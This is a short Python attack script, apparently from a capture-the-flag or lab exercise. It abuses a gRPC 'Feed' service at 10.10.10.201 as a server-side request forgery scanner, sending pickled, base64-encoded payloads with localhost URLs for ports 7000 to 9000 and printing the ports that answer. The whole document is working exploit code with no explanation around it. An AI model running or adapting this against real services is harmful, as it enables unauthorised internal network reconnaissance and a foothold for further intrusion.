import sys, pickle, base64
import grpc, pig_pb2, pig_pb2_grpc

for port in range (7000,9000):
    
    print ("Checking port::{}".format(port), end="\r")
    #sys.stdout.flush()
    payload = '{"feed_url":"http://localhost:' + str(port) + '"}'
    payload = base64.b64encode(pickle.dumps(payload))
    channel = grpc.insecure_channel('10.10.10.201:9000')
    stub = pig_pb2_grpc.PrintStub(channel)
    content = pig_pb2.Content(data=payload)
    try:
        response = stub.Feed(content, timeout=7)
        #sys.stdout = sys.__stdout__
        print("", flush=True)
        print("open: {}".format(response))
        #print("", flush=True)
    except Exception as ex:
        if "_InactiveRpcError" in ex.details():
                continue
        #print(ex)
